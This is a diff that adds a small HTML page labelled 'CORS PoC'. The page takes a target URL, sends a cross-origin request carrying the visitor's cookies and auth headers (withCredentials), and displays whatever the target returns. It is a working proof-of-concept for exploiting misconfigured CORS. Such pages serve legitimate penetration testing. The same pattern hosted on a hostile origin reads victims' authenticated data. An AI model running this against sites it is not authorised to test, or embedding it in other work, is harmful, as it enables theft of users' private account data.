@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>CORS PoC</h2>
+    <p>Enter the target URL below and click "Exploit" to test for CORS:</p>
+    <input type="text" id="targetUrl" placeholder="https://example.com/endpoint" style="width: 80%;" />
+    <button type="button" onclick="cors()">Exploit</button>
+    <pre id="response" style="border: 1px solid #ccc; padding: 10px; margin-top: 10px; white-space: pre-wrap; background-color: #f9f9f9;"></pre>
+
+    <script>
+      function cors() {
+        const targetUrl = document.getElementById("targetUrl").value;
+        const responseElement = document.getElementById("response");
+
+        // Clear previous results
+        responseElement.textContent = "Loading...";
+
+        // Validate the URL format
+        if (!targetUrl.startsWith("http://") && !targetUrl.startsWith("https://")) {
+          responseElement.textContent = "Error: Please enter a valid URL starting with http:// or https://";
+          return;
+        }
+
+        const xhr = new XMLHttpRequest();
+
+        xhr.onreadystatechange = function () {
+          if (this.readyState === 4) {
+            if (this.status === 200) {
+              responseElement.textContent = "Response:\n" + this.responseText;
+            } else {
+              responseElement.textContent = `Error: HTTP Status ${this.status} - ${this.statusText}`;
+            }
+          }
+        };
+
+        xhr.onerror = function () {
+          responseElement.textContent = "Error: Failed to connect to the target URL.";
+        };
+
+        xhr.open("GET", targetUrl, true);
+        xhr.withCredentials = true; // Include cookies/auth headers in the request
+        xhr.send();
+      }
+    </script>
+  </body>
+</html>
